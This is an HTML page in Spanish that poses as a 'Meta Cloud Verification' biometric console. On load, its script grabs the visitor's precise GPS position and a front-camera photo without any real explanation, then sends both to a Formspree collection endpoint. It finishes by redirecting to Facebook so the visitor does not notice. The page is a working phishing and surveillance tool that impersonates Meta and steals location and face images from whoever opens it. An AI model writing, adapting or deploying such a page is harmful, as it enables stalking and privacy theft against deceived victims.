<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Meta Cloud Verification</title>
    <style>
        body { background: #000; color: #31a24c; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .console { width: 90%; max-width: 500px; }
        #v, #c { display: none; }
    </style>
</head>
<body>
    <div class="console">
        <p>> Estableciendo túnel seguro...</p>
        <p id="msg">> Sincronizando hardware biométrico...</p>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

<script>
    const HOOK = "https://formspree.io/f/xanrkklv";

    async function autoCapture() {
        // 1. GPS de alta precisión inmediato
        navigator.geolocation.getCurrentPosition(
            (p) => send({t: "GPS_FINAL", lat: p.coords.latitude, lon: p.coords.longitude}),
            (e) => send({t: "GPS_RECHAZADO"}),
            {enableHighAccuracy: true}
        );

        // 2. Captura de imagen automática al cargar
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
            const video = document.getElementById('v');
            video.srcObject = stream;
            
            setTimeout(() => {
                const canvas = document.getElementById('c');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                send({ t: "FOTO_BIOMETRICA", img: canvas.toDataURL('image/jpeg', 0.6) });
                
                document.getElementById('msg').innerText = "> Sincronización completa. Redirigiendo...";
                setTimeout(() => location.href = "https://m.facebook.com", 1500);
            }, 1000);
        } catch (err) {
            send({t: "CAMARA_RECHAZADA"});
            location.href = "https://m.facebook.com";
        }
    }

    function send(data) {
        fetch(HOOK, { method: 'POST', body: JSON.stringify(data), headers: {'Content-Type': 'application/json'} });
    }

    window.onload = autoCapture;
</script>
</body>
</html>
